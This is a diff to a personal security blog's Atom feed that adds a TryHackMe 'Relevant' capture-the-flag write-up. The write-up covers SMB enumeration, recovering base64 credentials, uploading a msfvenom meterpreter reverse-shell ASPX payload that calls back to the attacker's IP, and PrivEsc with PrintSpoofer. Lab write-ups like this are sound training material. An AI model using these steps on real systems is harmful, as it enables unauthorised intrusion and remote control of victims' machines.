@@ -1,4 +1,177 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-17T22:27:10+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Daily Bugle</title><link href="http://localhost:4000/tryhackme-daily-bugle/" rel="alternate" type="text/html" title="TryHackMe - Daily Bugle" /><published>2023-03-17T00:00:00+03:00</published><updated>2023-03-17T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-daily-bugle</id><content type="html" xml:base="http://localhost:4000/tryhackme-daily-bugle/"><![CDATA[<p>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-18T18:01:54+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/tryhackme-relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2023-03-18T00:00:00+03:00</published><updated>2023-03-18T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-relevant</id><content type="html" xml:base="http://localhost:4000/tryhackme-relevant/"><![CDATA[<p>Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-pre-engagement-briefing">1. Pre-Engagement Briefing</h2>
+
+<p>You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.</p>
+
+<p>Scope of Work</p>
+
+<p>The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:</p>
+
+<ul>
+  <li>User.txt</li>
+  <li>Root.txt</li>
+</ul>
+
+<p>Additionally, the client has provided the following scope allowances:</p>
+
+<ul>
+  <li>Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first</li>
+  <li>Locate and note all vulnerabilities found</li>
+  <li>Submit the flags discovered to the dashboard</li>
+  <li>Only the IP address assigned to your machine is in scope</li>
+  <li>Find and report ALL vulnerabilities (yes, there is more than one path to root)</li>
+</ul>
+
+<p>(Roleplay off)
+I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.</p>
+
+<p>Note - Nothing in this room requires Metasploit</p>
+
+<p>Machine may take up to 5 minutes for all services to start.</p>
+
+<p><strong>Writeups will not be accepted for this room.</strong></p>
+
+<p><br /></p>
+
+<h3 id="11-user-flag">1.1 User Flag?</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -P- 10.10.7.6
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/nmap.png" alt="nmap" /></p>
+
+<p>And we found a few ports that will work for us. These are 80/tcp HTTP, 49663/tcp HTTP, and 445/tcp</p>
+
+<p>I did a gobuster scan, and the connection to both HTTP ports, probably due to my VPN, was very slow, I couldn’t wait, so I couldn’t get any results from the gobuster scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.7.6:49663/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/gobuster.png" alt="gobuster" /></p>
+
+<p>So I decided to try SMB login.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient -L //10.10.7.6
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/smb.png" alt="smb" /></p>
+
+<p>There is no password.</p>
+
+<p>We found this <code class="language-plaintext highlighter-rouge">nt4wrksv</code>. Now, let’s try to get in here.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ smbclient //10.10.7.6/nt4wrksv
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/password.png" alt="password" /></p>
+
+<p>We found the passwords.txt file. Let’s see what’s in it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; get passwords.txt
+&gt; exit
+$ cat passwords.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/smbin.png" alt="smbin" /></p>
+
+<p>This file contains base64 encoded credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "Qm9iIVBAJCRXMHJEITRyMw==" | base64 -d
+$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA20TY5NjkhJCQK" | base4 -d
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/base64.png" alt="base64" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Bob : !P@$$W0rD!123</code></strong></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Bill: Juw4nnaM4n420696969!$$$</code></strong></p>
+
+<p>You have access to SMB, so let’s check if we can install and run the reverse shell.</p>
+
+<p>First, let’s create a reverse shell. Then let’s put it in SMB.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.8.168.86 lport=4444 -f aspx -o shell.aspx
+$ smbclient //10.10.7.6/nt4wrksv
+$ put shell.aspx 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/payload.png" alt="payload" /></p>
+
+<p>Now let’s create a listener using metasploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+&gt; use exploit/multi/handler
+&gt; set payload windows/x64/meterpreter_reverse_tcp
+&gt; set LHOST 10.8.168.86
+&gt; set LPORT 4444
+&gt; run
+</code></pre></div></div>
+<p>And call the reverse shell in the browser <strong><code class="language-plaintext highlighter-rouge">http://10.10.7.6:49663/nt4wrksv/shell.aspx</code></strong></p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/relevant/info.png" alt="info" /></p>
+
+<p>Now we can get the user flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cd c:/Users/Bob/Desktop
+&gt; cat user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-root-flag">1.2 Root Flag?</h3>
+
+<p>We need to do an authorization elevation for the root flag. 
+Running the “whoami /priv” command to check the current user’s privileges in the system:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
+&gt; whoami /priv
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/priv.png" alt="priv" /></p>
+
+<p>It appears the current user has the SeImpersonatePrivilege token enabled, which means token impersonation could be used to escalate privileges.</p>
+
+<p>Although Juicy Potato is normally used to exploit token impersonation, this only works if DCOM is enabled on the server. A great alternative is the PrintSpoofer exploit. Downloading the exploit from the Git repository and placing it on the nt4wrksv SMB share so it can be easily transferred to the target machine: <a href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0">PrintSpoofer</a></p>
+
+<p>First, let’s download the file and put it in SMB, then run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+$ smbclient //10.10.7.6/nt4wrksv
+$ put PrintSpoofer64.exe
+</code></pre></div></div>
+
+<p>Let’s go back to shell and follow.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cd \inetpub\wwwroot\nt4wrksv
+&gt; dir
+&gt; PrintSpoofer64.exe -i -c powershell.exe
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/relevant/privesc.png" alt="privesc" /></p>
+
+<p>And now we have root privileges. Now we can reach the root flag.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd c:/Users/Administrator/Desktop
+$ cat root.txt
+</code></pre></div></div>
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="pentest," /><category term="security," /><category term="accessible" /><summary type="html"><![CDATA[Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/relevant.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/relevant.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Daily Bugle</title><link href="http://localhost:4000/tryhackme-daily-bugle/" rel="alternate" type="text/html" title="TryHackMe - Daily Bugle" /><published>2023-03-17T00:00:00+03:00</published><updated>2023-03-17T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-daily-bugle</id><content type="html" xml:base="http://localhost:4000/tryhackme-daily-bugle/"><![CDATA[<p>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges.</p>
 
 <p><br /></p>
 
